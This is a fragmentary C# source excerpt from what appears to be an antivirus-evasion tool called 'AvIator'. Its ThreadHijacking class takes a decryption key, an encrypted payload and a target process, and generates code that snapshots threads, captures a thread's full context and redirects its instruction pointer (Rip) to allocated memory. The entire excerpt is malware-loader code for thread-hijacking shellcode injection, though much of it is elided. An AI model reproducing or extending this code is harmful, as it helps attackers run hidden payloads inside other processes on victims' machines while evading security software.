...
namespace AvIator
{
    class ThreadHijacking
    {
        ...
        public ThreadHijacking(String decKey, String encPayload, String proc)
        {
            code = @"using System;
                        using System;
                        using System.Collections.Generic;
                                    ...
                                    class Program
                                    {
                                        ...
                                        static void Main(string[] args)
                                        {
                                           ...
                                           snapshotHandle = InjectShellcode.CreateToolhelp32Snapshot(InjectShellcode.SnapshotFlags.Thread, 0);     
                                            ...
                                            context.ContextFlags = InjectShellcode.CONTEXT_FLAGS.CONTEXT_ALL;
                                            ...
                                            IntPtr thrId;
                                                ...
                                                context.Rip = (ulong) ptrToMemoryAlloc.ToInt64();
